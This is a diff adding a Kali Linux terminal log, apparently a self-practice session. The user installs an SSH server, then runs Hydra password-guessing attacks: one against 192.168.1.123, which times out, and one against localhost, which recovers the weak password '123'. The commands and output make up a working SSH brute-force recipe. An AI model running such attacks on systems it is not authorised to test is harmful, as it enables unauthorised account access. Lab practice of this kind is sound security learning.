@@ -1,0 +1,165 @@
+┌──(igor㉿igor)-[~]
+└─$ systemct1 status ssh
+Could not find command-not-found database. Run 'sudo apt update' to populate it.
+systemct1: command not found
+                                                                             
+┌──(igor㉿igor)-[~]
+└─$ sudo apt update     
+[sudo] password for igor: 
+Get:1 http://kali.koyanet.lv/kali kali-rolling InRelease [41.2 kB]
+Get:2 http://kali.koyanet.lv/kali kali-rolling/main amd64 Packages [19.5 MB]
+Get:3 http://kali.koyanet.lv/kali kali-rolling/main amd64 Contents (deb) [45.8 MB]
+Get:4 http://kali.koyanet.lv/kali kali-rolling/contrib amd64 Packages [119 kB]
+Get:5 http://kali.koyanet.lv/kali kali-rolling/contrib amd64 Contents (deb) [229 kB]
+Get:6 http://kali.koyanet.lv/kali kali-rolling/non-free amd64 Packages [231 kB]
+Get:7 http://kali.koyanet.lv/kali kali-rolling/non-free amd64 Contents (deb) [917 kB]
+Fetched 66.8 MB in 32s (2059 kB/s)                                          
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+857 packages can be upgraded. Run 'apt list --upgradable' to see them.
+                                                                             
+┌──(igor㉿igor)-[~]
+└─$ systemct1 status ssh
+Command 'systemct1' not found, did you mean:
+  command 'systemctl' from deb systemd
+  command 'systemctl' from deb systemctl
+Try: sudo apt install <deb name>
+                                                                             
+┌──(igor㉿igor)-[~]
+└─$ sudo apt-get install openssh-server
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+The following additional packages will be installed:
+  openssh-client openssh-sftp-server
+Suggested packages:
+  keychain libpam-ssh monkeysphere ssh-askpass molly-guard ufw
+The following packages will be upgraded:
+  openssh-client openssh-server openssh-sftp-server
+3 upgraded, 0 newly installed, 0 to remove and 854 not upgraded.
+Need to get 1511 kB of archives.
+After this operation, 98.3 kB of additional disk space will be used.
+Do you want to continue? [Y/n] y
+Get:1 http://kali.koyanet.lv/kali kali-rolling/main amd64 openssh-sftp-server amd64 1:9.4p1-1 [66.3 kB]
+Get:2 http://kali.koyanet.lv/kali kali-rolling/main amd64 openssh-server amd64 1:9.4p1-1 [458 kB]
+Get:3 http://kali.koyanet.lv/kali kali-rolling/main amd64 openssh-client amd64 1:9.4p1-1 [986 kB]
+Fetched 1511 kB in 2s (870 kB/s)    
+Preconfiguring packages ...
+(Reading database ... 398459 files and directories currently installed.)
+Preparing to unpack .../openssh-sftp-server_1%3a9.4p1-1_amd64.deb ...
+Unpacking openssh-sftp-server (1:9.4p1-1) over (1:9.3p2-1) ...
+Preparing to unpack .../openssh-server_1%3a9.4p1-1_amd64.deb ...
+Unpacking openssh-server (1:9.4p1-1) over (1:9.3p2-1) ...
+Preparing to unpack .../openssh-client_1%3a9.4p1-1_amd64.deb ...
+Unpacking openssh-client (1:9.4p1-1) over (1:9.3p2-1) ...
+Setting up openssh-client (1:9.4p1-1) ...
+Installing new version of config file /etc/ssh/ssh_config ...
+Setting up openssh-sftp-server (1:9.4p1-1) ...
+Setting up openssh-server (1:9.4p1-1) ...
+Installing new version of config file /etc/ssh/moduli ...
+rescue-ssh.target is a disabled or a static unit not running, not starting it.
+ssh.service is a disabled or a static unit not running, not starting it.
+ssh.socket is a disabled or a static unit not running, not starting it.
+Processing triggers for kali-menu (2023.4.3) ...
+Processing triggers for man-db (2.11.2-3) ...
+                                                                             
+┌──(igor㉿igor)-[~]
+└─$ sudo nano /etc/ssh/sshd_config     
+                                                                             
+┌──(igor㉿igor)-[~]
+└─$ sudo service ssh restart      
+                                                                             
+┌──(igor㉿igor)-[~]
+└─$ 
+                                                                             
+┌──(igor㉿igor)-[~]
+└─$ 
+                                                                             
+┌──(igor㉿igor)-[~]
+└─$ sudo apt-get install hydra         
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+hydra is already the newest version (9.5-1).
+hydra set to manually installed.
+0 upgraded, 0 newly installed, 0 to remove and 854 not upgraded.
+                                                                             
+┌──(igor㉿igor)-[~]
+└─$ hydra -l igor -P /home/igor/Desktop/passwords ssh://192.168.1.123
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-22 16:55:41
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 499 login tries (l:1/p:499), ~32 tries per task
+[DATA] attacking ssh://192.168.1.123:22/
+            
+
+
+[ERROR] could not connect to ssh://192.168.1.123:22 - Timeout connecting to 192.168.1.123
+                                                                             
+┌──(igor㉿igor)-[~]
+└─$ 
+                                                                             
+┌──(igor㉿igor)-[~]
+└─$ 
+                                                                             
+┌──(igor㉿igor)-[~]
+└─$ 
+                                                                             
+┌──(igor㉿igor)-[~]
+└─$ ipconfig
+Command 'ipconfig' not found, did you mean:
+  command 'ifconfig' from deb net-tools
+  command 'iconfig' from deb ipmiutil
+  command 'iwconfig' from deb wireless-tools
+  command 'hipconfig' from deb hipcc
+Try: sudo apt install <deb name>
+                                                                             
+┌──(igor㉿igor)-[~]
+└─$ hostnam                                                          
+Command 'hostnam' not found, did you mean:
+  command 'hostname' from deb hostname
+Try: sudo apt install <deb name>
+                                                                             
+┌──(igor㉿igor)-[~]
+└─$ hostname
+igor
+                                                                             
+┌──(igor㉿igor)-[~]
+└─$ hostname igor
+hostname: you must be root to change the host name
+                                                                             
+┌──(igor㉿igor)-[~]
+└─$ hydra -l igor -P /home/igor/Desktop/passwords ssh://127.0.0.1    
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-22 16:58:06
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 499 login tries (l:1/p:499), ~32 tries per task
+[DATA] attacking ssh://127.0.0.1:22/
+
+[STATUS] 105.00 tries/min, 105 tries in 00:01h, 396 to do in 00:04h, 14 active
+
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
+                                                                             
+┌──(igor㉿igor)-[~]
+└─$ hydra -l igor -P /home/igor/Desktop/passwords ssh://127.0.0.1
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-22 16:59:24
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 500 login tries (l:1/p:500), ~32 tries per task
+[DATA] attacking ssh://127.0.0.1:22/
+[STATUS] 97.00 tries/min, 97 tries in 00:01h, 406 to do in 00:05h, 13 active
+[STATUS] 92.00 tries/min, 276 tries in 00:03h, 227 to do in 00:03h, 13 active
+[22][ssh] host: 127.0.0.1   login: igor   password: 123
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 4 final worker threads did not complete until end.
+[ERROR] 4 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-22 17:05:14
+                                                                             
+┌──(igor㉿igor)-[~]
+└─$ 
